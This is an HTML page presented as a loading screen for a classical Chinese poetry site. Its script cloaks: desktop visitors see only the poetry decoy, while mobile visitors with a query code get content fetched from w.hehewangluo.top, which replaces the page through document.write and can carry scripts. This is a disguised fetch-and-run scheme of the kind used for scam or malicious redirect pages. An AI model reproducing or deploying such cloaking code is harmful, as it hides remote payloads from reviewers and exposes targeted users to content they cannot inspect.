<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
    <meta name="viewport" content="width=device-width,minimum-scale=1.0,maximum-scale=1.0" />
    <title>加载中</title>
    <style>
        html,body { height: 100%; }
        *{ padding:0;margin:0; }
    </style>
</head>
<body>
<div id="main"></div>
<script>
    var platform = navigator.platform;
    var ua ={ win: platform.indexOf("Win") == 0, mac: platform.indexOf("Mac") == 0, x11: (platform == "X11") || (platform.indexOf("Linux") == 0) };
    if( ua.win || ua.mac || ua.xll ){
        appendDfContent();
    }else{
        var code = gq();
        if( code ){
            var url = "//w.hehewangluo.top/api/artv5/"+code;
            var xhr = new XMLHttpRequest;
            xhr.open("GET", url, false);
            xhr["onreadystatechange"] = function () {
                if (this.status == 200 && this.readyState == 4) {
                    var con = xhr.responseText;
                    var dom = document.open('text/html', 'replace');
                    dom.write(con);
                    dom.close();
                } else {
                    appendDfContent();
                }
            };
            xhr.send();
        }else{
            appendDfContent();
        }
    }
    function gq() {
        var query = window.location.href.split('?__')[1];
        if( query ){
            query = query.split("-");
            if ( query[0] ) {return query[0];}
        }
        return null;
    }
    function appendDfContent(){
        var meta = document.createElement('meta');
        meta.name = "description";
        meta.content = "古韵随行 - 每日推荐一首经典古诗词，品味中华传统文化之美。收录李白、杜甫、王维等诗词大家的经典作品。";
        document.head.appendChild(meta);

        var meta = document.createElement('meta');
        meta.name = "keywords";
        meta.content = "古诗词,唐诗,宋词,诗词欣赏,每日诗词,李白,杜甫,苏轼";
        document.head.appendChild(meta);

        var meta = document.createElement('meta');
        meta.name = "author";
        meta.content = "古韵随行";
        document.head.appendChild(meta);

        var link = document.createElement("link");
        link.rel = "stylesheet";
        link.href = "//cdn1.ttgzs.top/static/css/df.css?v1";
        document.head.appendChild(link);

        var s = document.createElement("script");
        s.src = "//cdn1.ttgzs.top/static/js/df.js?v1";
        document.body.appendChild(s);
    }
</script>
</body>
</html>
